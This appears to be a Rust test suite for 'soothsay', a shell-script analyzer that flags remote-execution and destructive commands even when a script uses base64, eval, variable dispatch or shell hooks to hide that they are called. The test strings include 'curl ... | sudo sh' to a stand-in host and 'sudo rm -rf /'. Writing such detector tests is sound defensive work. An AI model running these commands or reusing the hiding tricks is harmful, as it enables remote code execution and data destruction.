//! A script must not be able to hide what it does by making soothsay think a
//! function is never called.

use soothsay::{analyze, Category, Report};

const EVIL: &str = "main() {\n  curl -s https://e.x/p | sudo sh\n}\n";

fn remote_exec_reachable(r: &Report) -> bool {
    r.findings
        .iter()
        .any(|f| f.category == Category::RemoteExec && f.reachable)
}

#[track_caller]
fn assert_reachable(src: &str) {
    let r = analyze(src);
    assert!(remote_exec_reachable(&r), "{src}\n{:#?}", r.findings);
}

#[test]
fn positional_dispatch_reaches_every_function() {
    assert_reachable(&format!("{EVIL}\"$@\"\n"));
    assert_reachable(&format!("{EVIL}\"$1\" --flag\n"));
    assert_reachable(&format!("{EVIL}${{1:-help}}\n"));
}

#[test]
fn fallback_name_is_a_call() {
    assert_reachable(&format!("{EVIL}${{1:-main}}\n"));
}

#[test]
fn decoded_name_reaches_every_function() {
    assert_reachable(&format!("f=$(echo bWFpbg== | base64 -d)\n{EVIL}$f\n"));
    assert_reachable(&format!("{EVIL}eval \"$(printf mai)n\"\n"));
}

#[test]
fn every_value_of_a_variable_is_a_call() {
    assert_reachable(&format!("{EVIL}f=help\n[ -n \"$x\" ] && f=main\n$f\n"));
}

#[test]
fn shell_hooks_are_called_by_the_shell() {
    for hook in ["command_not_found_handle", "precmd", "TRAPEXIT"] {
        assert_reachable(&format!(
            "{hook}() {{\n  curl -s https://e.x/p | sh\n}}\nzzz\n"
        ));
    }
}

#[test]
fn dynamic_call_in_dead_code_does_not_count() {
    let r = analyze(&format!("{EVIL}dead() {{\n  \"$1\"\n}}\n"));
    assert!(!remote_exec_reachable(&r), "{:#?}", r.findings);
}

#[test]
fn wrappers_are_not_dynamic_dispatch() {
    // rustup's `ensure` runs its arguments; its callers name the command.
    let r = analyze(&format!(
        "{EVIL}ensure() {{\n  \"$@\" || exit 1\n}}\nensure mkdir -p \"$HOME/.x\"\n"
    ));
    assert!(!remote_exec_reachable(&r), "{:#?}", r.findings);
    // ...unless a caller passes something dynamic.
    assert_reachable(&format!(
        "{EVIL}ensure() {{\n  \"$@\" || exit 1\n}}\nensure \"$1\"\n"
    ));
}

#[test]
fn running_a_downloaded_path_is_not_dispatch() {
    let r = analyze(&format!(
        "{EVIL}_dir=\"$(mktemp -d)\"\n\"$_dir/rustup-init\" -y\n"
    ));
    assert!(!remote_exec_reachable(&r), "{:#?}", r.findings);
}

#[test]
fn tricky_fixture_keeps_dead_code_dead() {
    let src = std::fs::read_to_string(format!(
        "{}/tests/fixtures/tricky.sh",
        env!("CARGO_MANIFEST_DIR")
    ))
    .unwrap();
    let r = analyze(&src);
    assert!(r
        .findings
        .iter()
        .filter(|f| f.function.as_deref() == Some("nuke"))
        .all(|f| !f.reachable));
}

fn cli(args: &[&str], stdin: &str) -> i32 {
    use std::io::Write;
    use std::process::{Command, Stdio};
    let mut child = Command::new(env!("CARGO_BIN_EXE_soothsay"))
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(stdin.as_bytes())
        .unwrap();
    child.wait().unwrap().code().unwrap_or(-1)
}

#[test]
fn policy_counts_never_called_code_by_default() {
    let script = "nuke() {\n  sudo rm -rf /\n}\necho hi\n";
    assert_eq!(cli(&["--fail-on", "danger"], script), 1);
    assert_eq!(cli(&["--deny", "destructive"], script), 1);
    assert_eq!(
        cli(&["--fail-on", "danger", "--ignore-unreachable"], script),
        0
    );
}
